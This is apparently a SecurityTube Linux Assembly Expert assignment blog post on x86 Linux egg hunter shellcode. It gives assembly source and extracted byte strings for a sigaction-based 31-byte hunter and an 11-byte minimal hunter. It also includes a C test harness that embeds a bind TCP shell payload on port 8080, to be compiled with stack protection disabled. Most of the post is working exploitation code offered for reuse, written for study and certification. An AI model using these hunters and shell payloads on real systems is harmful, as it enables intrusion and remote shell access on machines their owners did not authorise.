# Assignment 3

* Study about Egg Hunters shellcode
* Create a working demo of the Egghunter
* Should be configurable for different payloads

## What is a Egg Hunter?

In classic stack based buffer overflow, the buffer size is big enough to hold the shellcode, but what happen if this is not the case? 
Let's assume that our shellcode is 100 bytes and we have only 35 bytes available, where should be stored the left 65 bytes?

Well, Egg hunting technique was introduced to overcome this condition!

An Egg Hunter is a tiny payload that searches in the virtual memory of the process for an *egg*, which is nothing more than a tag that denotes the start of the shellcode to execute. 
In other words, when using an Egg Hunter we are talking about a two stage shellcode:

1. A tiny payload - injected exploiting a buffer overflow - that looks for an egg and once found it pass the execution there;
2. The real payload to execute - passed to the program using an input parameter - whose start is denoted by the egg searched by the previous payload.

The requirements for an Egg Hunter are **being small**, but **robust** enough to avoid any crash in the program exploited due to memory access violations (unallocated memory or locations in memory which our user doesn’t have permission to read). The attacker, depending on the scenario, is required to find the right balance betweem them.

Well, next question is, how do we safely inspect the virtual address space of a process? Firstly, knowing the target operating system is crucial. Being this assignment focused on Linux, let's inspect the several ways already studied in literature for that operating system. The document written by *skape*, which can be found at <http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf>, is illuminating and explains in details several approaches. Its read is strongly suggested.

## Execution

I decided to dive into the implementation of the Egg Hunger using the **sigaction** syscall. The following is the code implemented.

```
; Author :  Alessio Parzian
; Filename: egghunter_sigaction.asm

; compile with:
; 	nasm -f elf32 egghunter_sigaction.asm
;	ld -o egghunter_sigaction egghunter_sigaction.o
; extract shellcode with:
; 	objdump -d egghunter_sigaction | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | sed 's/^/\\x/g' | perl -pe 's/\r?\n//' | sed 's/$/\n/'

global _start

section .text

_start:

align_page:
    or  cx, 0xfff       ; setting lower 16 bits to 4095

next_address:
    inc ecx             ; moving it to 4096 (usual page size for x86 systems), this allow to avoid null chars 

    ; ==================
    ; sigaction syscall
    ; ==================
    ; > man 2 sigaction
    ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    ; ------------------
    xor eax, eax        ; zeroing register
    mov al, 0x43        ; syscall number sigaction 
    int 0x80            ; interrupt to ask for syscall execution
    ; ------------------
    
    cmp al, 0xf2        ; eax will contain 0xf2 (EFAULT) in case of invalid memory
    jz align_page       ; if ZF flag is set it means an invalid page address was found, thus a page alignment is required
    
    ; ==================
    ; scasd call
    ; ==================
    ; > https://en.wikipedia.org/wiki/X86_instruction_listings
    ; ------------------
    mov eax, 0xFCFCFCFC ; moving value of the egg as method parameter 
    mov edi, ecx        ; moving address of valid memory to scan 
    scasd               ; compares ES:[(E)DI] with EAX and increments or decrements (E)DI, depending on DF; can be prefixed with REP
    ; ------------------
    
    jnz next_address 	; if it doesn't match increase memory by one byte and try again
    
    ; ==================
    ; scasd call
    ; ==================
    ; > https://en.wikipedia.org/wiki/X86_instruction_listings
    ; ------------------
    scasd               ; scan again to check for the second part of the egg, this is required to avoid to find the egg in the egghunter
                        ; and believing to have found the one in the shellcode
                        ; parameters in registers are already set
    ; ------------------
    
    jnz next_address    ; if it dosent match increase memory by one byte and try again
    
    jmp edi             ; if this opcode is executed it means the was found and it the moment to pass the execution to the shellcode
```

The resulting shellcode is:

```
\x66\x81\xc9\xff\x0f\x41\x31\xc0\xb0\x43\xcd\x80\x3c\xf2\x74\xf0\xb8\xfc\xfc\xfc\xfc\x89\xcf\xaf\x75\xeb\xaf\x75\xe8\xff\xe7
```

It is 31 bytes long and contains no null bytes! However, what about if there would be the need of having an even smaller Egg Hunter? Probably, the robustness of the implemention should be sacrificed, but it might become a need in some real world exploitation scenarios. Let's have a look how we could decrease its size.

```
; Author :  Alessio Parzian
; Filename: egghunter_minimal.asm

; compile with:
; 	nasm -f elf32 egghunter_minimal.asm
;	ld -o egghunter_minimal egghunter_minimal.o
; extract shellcode with:
; 	objdump -d egghunter_minimal | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | sed 's/^/\\x/g' | perl -pe 's/\r?\n//' | sed 's/$/\n/'

; This is the smallest payload that I studied following <https://www.exploit-db.com/exploits/44334>
; However, this egghunter assumes that the egg is located in lower addresses than itself (it starts from it)
; if that wouldn't be the case probably the hunter will make the process crash trying to access invalid memory areas

global _start

section .text

_start:
	inc eax
	; the egg MUST BE EXECUTABLE 
	; 00000000  4F	dec di
	; 00000001  90	nop
	; 00000002  47  inc di
	; 00000003  90  nop
	cmp DWORD [eax], 0x4f904790
	jne	_start
	jmp eax
```

The resulting shellcode is:
```
\x40\x81\x38\x90\x47\x90\x4f\x75\xf7\xff\xe0
```

It is 11 bytes long and contains no null bytes! Well, let's implement a PoC to test the above reported egg hunters.

```c
/*
// Author: Alessio Parzian
// Filename: test_egghunter.c
//
// Test your egghunter with a shellcode. Replace shellcode variable value with your own shell, compile and execute.
// Compile with:
//	gcc $file_name -fno-stack-protector -z execstack -o $out_name
*/

#include <stdio.h>
#include <string.h>

// Change eggs accordingly with your preference and the type of hunter chosen
#define EXECEGG0 "\xfc\xfc\xfc\xfc" // NO NEED OF EXECUTION
#define EXECEEG1 "\x90\x47\x90\x4f" // NEED OF EXECUTION (order reversed in egg_hunter1)

// Change shellcodes based on your needs!
 
// ====================
// SIGACTION EGGHUNTER
// ====================

// Size: 31 bytes
unsigned char egg_hunter0[] = \
"\x66\x81\xc9\xff\x0f\x41\x31\xc0\xb0\x43\xcd\x80\x3c\xf2\x74\xf0\xb8"
EXECEGG0
"\x89\xcf\xaf\x75\xeb\xaf\x75\xe8\xff\xe7";

// Bind TCP Shell on port 8080
// Size 124 bytes
unsigned char shellcode0[] = \
EXECEGG0
EXECEGG0
// Change shellcode here if you want other payloads
"\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x66\xb8\x67\x01"
"\xb3\x02\xb1\x01\xcd\x80\x89\xc6\x66\xb8\x69\x01\x89\xf3\x52\x66"
"\x68\x1f\x90\x66\x6a\x02\x89\xe1\x31\xd2\x83\xc2\x10\xcd\x80\x66"
"\xb8\x6b\x01\x89\xf3\x31\xc9\xcd\x80\x66\xb8\x6c\x01\x89\xf3\x31"
"\xd2\x52\x52\x89\xe1\x6a\x02\x89\xe2\x31\xf6\xcd\x80\x89\xc3\x31"
"\xc9\xb1\x03\x31\xc0\xb0\x3f\xfe\xc9\xcd\x80\x75\xf6\x31\xc0\x50"
"\xb0\x0b\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xff"
"\x57\x89\xe2\x53\x89\xe1\xcd\x80";

// ====================
// SMALLEST EGGHUNTER
// ====================

// Size: 11 bytes
unsigned char egg_hunter1[] = \
"\x40\x81\x38\x90\x47\x90\x4f\x75\xf7\xff\xe0";

// Bind TCP Shell on port 8080
// Size: 128 bytes
unsigned char shellcode1[] = \
EXECEEG1
// Change shellcode here if you want other payloads
"\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x66\xb8\x67\x01"
"\xb3\x02\xb1\x01\xcd\x80\x89\xc6\x66\xb8\x69\x01\x89\xf3\x52\x66"
"\x68\x1f\x90\x66\x6a\x02\x89\xe1\x31\xd2\x83\xc2\x10\xcd\x80\x66"
"\xb8\x6b\x01\x89\xf3\x31\xc9\xcd\x80\x66\xb8\x6c\x01\x89\xf3\x31"
"\xd2\x52\x52\x89\xe1\x6a\x02\x89\xe2\x31\xf6\xcd\x80\x89\xc3\x31"
"\xc9\xb1\x03\x31\xc0\xb0\x3f\xfe\xc9\xcd\x80\x75\xf6\x31\xc0\x50"
"\xb0\x0b\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xff"
"\x57\x89\xe2\x53\x89\xe1\xcd\x80";

void main()
{
    printf("Length of Egg Hunter Shellcode:  %d\n", strlen(egg_hunter1));
    printf("Length of the Actual Shellcode:  %d\n", strlen(shellcode1));
    int (*ret)() = (int(*)())egg_hunter1;
    ret();
}
```

Well, this concludes assignment 3!

<br/>

---

*This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.*

<http://securitytube-training.com/online-courses/security-tube-linux-assembly-expert>

*Student-ID: PA-8733*